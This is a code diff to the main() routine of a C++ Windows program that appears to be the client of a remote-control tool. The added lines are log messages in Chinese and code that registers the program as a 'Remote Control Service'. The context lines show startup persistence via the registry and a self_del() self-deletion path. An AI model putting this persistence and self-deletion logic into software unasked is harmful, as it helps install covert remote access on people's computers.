@@ -182,14 +182,24 @@ BOOL CALLBACK callback(DWORD CtrlType)
     return TRUE;
 }
 
+void ServiceLogger(const char* message) {
+	Logger::getInstance().log(NULL, 0, "%s", message);
+}
+
 int main(int argc, const char *argv[])
 {
+    Mprintf("启动运行: %s %s. Arg Count: %d\n", argv[0], argc>1 ? argv[1] : "", argc);
+    InitWindowsService({ "RemoteControlService", "Remote Control Service", "Provides remote desktop control functionality." }, ServiceLogger);
     bool isService = g_SETTINGS.iStartup == Startup_GhostMsc;
     // 注册启动项
     int r = RegisterStartup("Windows Ghost", "WinGhost", !isService);
     if (r <= 0) {
         BOOL s = self_del();
-        if (!IsDebug)return r;
+        if (!IsDebug) {
+            Mprintf("结束运行.");
+			Sleep(1000);
+            return r;
+        }
     }
 
     if (!SetSelfStart(argv[0], REG_NAME)) {
@@ -202,7 +212,11 @@ int main(int argc, const char *argv[])
         for (int i = 0; !ret && i < argc; i++) {
             Mprintf(" Arg [%d]: %s\n", i, argv[i]);
         }
-        if (ret) return 0x20251123;
+        if (ret) {
+            Mprintf("结束运行.");
+            Sleep(1000);
+            return 0x20251123;
+        }
     }
 
     status = E_RUN;
@@ -212,6 +226,8 @@ int main(int argc, const char *argv[])
         CloseHandle(hMutex);
         hMutex = NULL;
 #ifndef _DEBUG
+        Mprintf("结束运行.");
+        Sleep(1000);
         return -2;
 #endif
     }
@@ -246,6 +262,7 @@ int main(int argc, const char *argv[])
     status = E_STOP;
 
     CloseHandle(hMutex);
+    Mprintf("结束运行.");
     Logger::getInstance().stop();
 
     return 0;
